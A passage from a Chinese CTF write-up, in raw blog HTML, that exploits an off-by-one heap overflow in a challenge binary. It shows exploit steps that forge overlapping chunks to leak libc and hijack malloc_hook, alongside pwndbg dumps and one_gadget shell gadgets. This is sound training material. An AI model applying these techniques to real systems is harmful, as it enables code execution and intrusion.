v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      v3 += v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  v2 = getnum(v1);</span><br><span class=\"line\">  v3 = v2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt;= <span class=\"number\">0</span> &amp;&amp; v2 &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * v2);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">      v2 = output_content(<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * v3], *((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;Size + <span class=\"number\">4</span> * v3));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码实现的逻辑还算比较哇民政，没有太大的问题。由于题目保护全开了，操作空间就很小。唯一的漏洞还非常明显 if (a2 - a1 == 10)<br>\n LODWORD (result) = a1 + 1;   其中 a1 是我们创建时输入的 size，a2 是我们进行 write 时输入的 size，经典的手法创建时是不进行 16 字节对齐，卡最大的堆块界限，0x88，write 时只要输入的时 0x88+10 ，就可以实现 1 字节的溢出。</p>\n<h2 id=\"解题\"><a class=\"markdownIt-Anchor\" href=\"#解题\">#</a> 解题：</h2>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>因为题目在申请堆块的时候，使用的是 calloc，会对返回的堆块进行初始化。所以我们必须构造的时堆块的重叠或者重复使用</p>\n<p>这里我们只着重介绍两种手法的实现，就不具体展示利用过程了，因为流程比较固定；</p>\n<h3 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> unlink</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)\t\t\t<span class=\"comment\">#泄露</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x68</span>+<span class=\"number\">10</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x61</span>+p64(<span class=\"number\">0x190</span>)+<span class=\"string\">b&#x27;\\x90&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<p>这个是经典的套路了，利用 unsortedbins 的双链表绕过 unlink 的检查，成功的 chunk0 合并到 topchunk，作为新的 topchunk, 这个时候 chunk1 仍在使用，但是被包含进了 topchnk，那么我们下面如果重复申请 add (0x88),add (0x18), 就可以在 bss 的链表中两次利用了，人为的 uaf，这里的话呢，我写的 0x18 比较小，可以写大点，比如 0x88，然后重复申请后，有两个地方的指针指向这块区域，释放一个，用另外一个进行泄露（因为 0x91 的大小又被写进了 unsortedbins）这样有了 libc 的基地址。通过上述流程我们就是实现了人为的 uaf。如果我们话存在一个 0x70 大小的堆块的重复利用，就可以进行 fastbinsattack，将 malloc_hook-0x23 写入 fastbins，然后就可以可以申请出来实现 malloc_hook 的劫持。</p>\n<p>这个操作就很经典了，劫持 malloc_hook 后查看栈的结构，寻找满足要求的 onegadegt</p>\n<h3 id=\"瞎操作\"><a class=\"markdownIt-Anchor\" href=\"#瞎操作\">#</a> 瞎操作</h3>\n<p>我在第一次进行 unlink 操作时，因为不仅修改了后面堆块的堆头，还修改了假 tophcunk 的堆头，同样想利用 unsortedbin 的双链表绕过检查，但是失败了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xb0</span>)+<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)</span><br></pre></td></tr></table></figure>\n<p>但是，却误打误撞的绕过了 unsortedbins 的检查，如果释放 1，然后修改他的 size（0x90—&gt;0xb0）, 期望能够切割堆块 (0x90)，然后剩下的 0x20 会被加入对应的 bins，这里会报错我还没有搞清楚原因，报错的信息大概是 prevsize 不合法。</p>\n<p>然后我的瞎操作就饶过了一系列的检查，虽然没能构造新的 topchunk, 但是 chunk1 的紧邻堆块 2 是我们在使用的，当我们 add (0x88)，会对其进行切割，剩下的 0x20 会进入 unsortedbin 的双链表，而这剩下的就是我们使用的 chunk2，这样 chunk 的 fd,bk 指针指向 main_arena，这样既可以完成了泄露</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x55ad680a80b0</span> —▸ <span class=\"number\">0x7f39d1cdab78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x55ad680a80b0</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>gx <span class=\"number\">0x55ad680a80b0</span></span><br><span class=\"line\"><span class=\"number\">0x55ad680a80b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000021</span></span><br><span class=\"line\">pwndbg&gt; </span><br></pre></td></tr></table></figure>\n<p>然后申请出来</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x55ad67ba8040</span>:\t<span class=\"number\">0x0000001800000001</span>\t<span class=\"number\">0x000055ad680a8010</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8050</span>:\t<span class=\"number\">0x0000008800000001</span>\t<span class=\"number\">0x000055ad680a8030</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8060</span>:\t<span class=\"number\">0x0000001800000001</span>\t<span class=\"number\">0x000055ad680a80c0</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8070</span>:\t<span class=\"number\">0x0000001000000001</span>\t<span class=\"number\">0x000055ad680a80c0</span></span><br></pre></td></tr></table></figure>\n<p>就可以重复利用，我们利用 chunk1 来修改 chunk 的 size（0x21----&gt;0x71），这样当 chunk2 释放后门进入 fastbin, 利用 chunk3 修改 fd 指针，就把 malloc_hook 链接入 fastbins。free chnnk  进入 fastbins 时，要保证 chunk 的下一个 chunk 合法，但是只会检查 size，这里我直接申请一个堆块绕过，后面申请到 aimed_chunk 就比较简单了。</p>\n<p>最后就是这个 onegadegt 了，很不幸这里没有合适的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RAX  <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RCX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x11</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R8   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x7f55c10ef6e0</span> (_nl_C_LC_CTYPE_class+<span class=\"number\">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class=\"line\"> R12  <span class=\"number\">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class=\"line\"> R13  <span class=\"number\">0x7ffc37dd49f0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7ffc37dd48a0</span> ◂— <span class=\"number\">0x7</span></span><br><span class=\"line\"> RIP  <span class=\"number\">0x7f55c0ffd028</span> (<span class=\"built_in\">calloc</span>+<span class=\"number\">680</span>) ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7f55c0ffd028</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">680</span>&gt;    call   rax</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02a</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>&gt;    xor    esi, esi</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02c</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">684</span>&gt;    test   rax, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02f</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">687</span>&gt;    mov    rdx, rbp</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd032</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">690</span>&gt;    mov    rdi, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd035</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">693</span>&gt;    jne    <span class=\"built_in\">calloc</span>+<span class=\"number\">656</span> &lt;<span class=\"number\">0x7f55c0ffd010</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd037</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">695</span>&gt;    xor    eax, eax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd039</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">697</span>&gt;    jmp    <span class=\"built_in\">calloc</span>+<span class=\"number\">312</span> &lt;<span class=\"number\">0x7f55c0ffceb8</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd03e</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">702</span>&gt;    nop    </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd040</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">704</span>&gt;    mov    rax, qword ptr [rip + <span class=\"number\">0x33ee31</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd047</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">711</span>&gt;    mov    dword ptr fs:[rax], <span class=\"number\">0xc</span></span><br><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp  <span class=\"number\">0x7ffc37dd48a0</span> ◂— <span class=\"number\">0x7</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│      <span class=\"number\">0x7ffc37dd48a8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│      <span class=\"number\">0x7ffc37dd48b0</span> —▸ <span class=\"number\">0x7ffc37dd48f0</span> —▸ <span class=\"number\">0x7ffc37dd4910</span> —▸ <span class=\"number\">0x55fafa1d42c0</span> ◂— push   r15</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│      <span class=\"number\">0x7ffc37dd48b8</span> —▸ <span class=\"number\">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│      <span class=\"number\">0x7ffc37dd48c0</span> —▸ <span class=\"number\">0x7ffc37dd49f0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│      <span class=\"number\">0x7ffc37dd48c8</span> —▸ <span class=\"number\">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│      <span class=\"number\">0x7ffc37dd48d0</span> ◂— <span class=\"number\">0x7fa1d39a0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│      <span class=\"number\">0x7ffc37dd48d8</span> ◂— <span class=\"number\">0x100000010</span></span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f <span class=\"number\">0</span>     <span class=\"number\">7f</span>55c0ffd028 <span class=\"built_in\">calloc</span>+<span class=\"number\">680</span></span><br><span class=\"line\">   f <span class=\"number\">1</span>     <span class=\"number\">55f</span>afa1d3cd1</span><br><span class=\"line\">   f <span class=\"number\">2</span>        <span class=\"number\">7f</span>a1d39a0</span><br><span class=\"line\">   f <span class=\"number\">3</span>        <span class=\"number\">100000010</span></span><br><span class=\"line\">   f <span class=\"number\">4</span>        <span class=\"number\">100000006</span></span><br><span class=\"line\">   f <span class=\"number\">5</span>  <span class=\"number\">3b</span>dcd6e58a0f900</span><br><span class=\"line\">   f <span class=\"number\">6</span>     <span class=\"number\">7f</span>fc37dd4910</span><br><span class=\"line\">   f <span class=\"number\">7</span>     <span class=\"number\">55f</span>afa1d4258</span><br><span class=\"line\">   f <span class=\"number\">8</span>        <span class=\"number\">137</span>dd49f0</span><br><span class=\"line\">   f <span class=\"number\">9</span>  <span class=\"number\">3b</span>dcd6e58a0f900</span><br><span class=\"line\">   f <span class=\"number\">10</span>     <span class=\"number\">55f</span>afa1d42c0</span><br><span class=\"line\">Program received signal <span class=\"title function_\">SIGSEGV</span> <span class=\"params\">(fault address <span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span> 40</span><br><span class=\"line\">00:0000│ rsp  0x7ffc37dd48a0 ◂— 0x7</span><br><span class=\"line\">01:0008│      0x7ffc37dd48a8 ◂— 0x0</span><br><span class=\"line\">02:0010│      0x7ffc37dd48b0 —▸ 0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">03:0018│      0x7ffc37dd48b8 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">04:0020│      0x7ffc37dd48c0 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">05:0028│      0x7ffc37dd48c8 —▸ 0x55fafa1d3cd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class=\"line\">06:0030│      0x7ffc37dd48d0 ◂— 0x7fa1d39a0</span><br><span class=\"line\">07:0038│      0x7ffc37dd48d8 ◂— 0x100000010</span><br><span class=\"line\">08:0040│      0x7ffc37dd48e0 ◂— 0x100000006</span><br><span class=\"line\">09:0048│      0x7ffc37dd48e8 ◂— 0x3bdcd6e58a0f900</span><br><span class=\"line\">0a:0050│      0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">0b:0058│      0x7ffc37dd48f8 —▸ 0x55fafa1d4258 ◂— jmp    0x55fafa1d42ad</span><br><span class=\"line\">0c:0060│      0x7ffc37dd4900 ◂— 0x137dd49f0</span><br><span class=\"line\">0d:0068│      0x7ffc37dd4908 ◂— 0x3bdcd6e58a0f900</span><br><span class=\"line\">0e:0070│      0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">0f:0078│      0x7ffc37dd4918 —▸ 0<span class=\"title function_\">x7f55c0f98840</span> <span class=\"params\">(__libc_start_main+<span class=\"number\">240</span>)</span> ◂— mov    edi, eax</span><br><span class=\"line\">10:0080│      0x7ffc37dd4920 —▸ 0x7ffc37dd49f8 —▸ 0x7ffc37dd6080 ◂— &#x27;./roarctf&#x27;</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">12:0090│      0x7ffc37dd4930 ◂— 0x1c1104708</span><br><span class=\"line\">13:0098│      0x7ffc37dd4938 —▸ 0x55fafa1d41ec ◂— push   rbp</span><br><span class=\"line\">14:00a0│      0x7ffc37dd4940 ◂— 0x0</span><br><span class=\"line\">15:00a8│      0x7ffc37dd4948 ◂— 0x21d72319ef57efa6</span><br><span class=\"line\">16:00b0│      0x7ffc37dd4950 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">17:00b8│      0x7ffc37dd4958 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">18:00c0│      0x7ffc37dd4960 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">1a:00d0│      0x7ffc37dd4970 ◂— 0x75dab899f897efa6</span><br><span class=\"line\">1b:00d8│      0x7ffc37dd4978 ◂— 0x748956d06527efa6</span><br><span class=\"line\">1c:00e0│      0x7ffc37dd4980 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">1f:00f8│      0x7ffc37dd4998 —▸ 0x7ffc37dd4a08 —▸ 0x7ffc37dd608a ◂— 0<span class=\"title function_\">x52454d554e5f434c</span> <span class=\"params\">(<span class=\"string\">&#x27;LC_NUMER&#x27;</span>)</span></span><br><span class=\"line\">20:0100│      0x7ffc37dd49a0 —▸ 0x7f55c1569168 —▸ 0x55fafa1d3000 ◂— jg     0x55fafa1d3047</span><br><span class=\"line\">21:0108│      0x7ffc37dd49a8 —▸ 0<span class=\"title function_\">x7f55c135280b</span> <span class=\"params\">(_dl_init+<span class=\"number\">139</span>)</span> ◂— jmp    0x7f55c13527e0</span><br><span class=\"line\">22:0110│      0x7ffc37dd49b0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">24:0120│      0x7ffc37dd49c0 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">25:0128│      0x7ffc37dd49c8 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">26:0130│      0x7ffc37dd49d0 ◂— 0x0</span><br><span class=\"line\">27:0138│      0x7ffc37dd49d8 —▸ 0x55fafa1d39c9 ◂— hlt    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们来看看 onegadegt:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ one_gadget /lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span> -l3</span><br><span class=\"line\">/var/lib/gems/<span class=\"number\">2.3</span><span class=\"number\">.0</span>/gems/one_gadget<span class=\"number\">-1.6</span><span class=\"number\">.2</span>/lib/one_gadget/fetchers/base.rb:<span class=\"number\">45</span>: warning: Insecure world writable dir /home/giantbranch in PATH, mode <span class=\"number\">040777</span></span><br><span class=\"line\"><span class=\"number\">0x45226</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rax == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x4527a</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x30</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xcd173</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == <span class=\"literal\">NULL</span> || rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xcd248</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rax, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rax] == <span class=\"literal\">NULL</span> || rax == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf03a4</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x50</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x50</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf03b0</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == <span class=\"literal\">NULL</span> || rsi == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [[rax]] == <span class=\"literal\">NULL</span> || [rax] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf1247</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf67f0</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, [rbp<span class=\"number\">-0xf8</span>])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == <span class=\"literal\">NULL</span> || rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [[rbp<span class=\"number\">-0xf8</span>]] == <span class=\"literal\">NULL</span> || [rbp<span class=\"number\">-0xf8</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这个时候我们尝试 realloc_hook,mallo_hook 复写为 realloc，realloc_hook 写为 onegadget ,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span 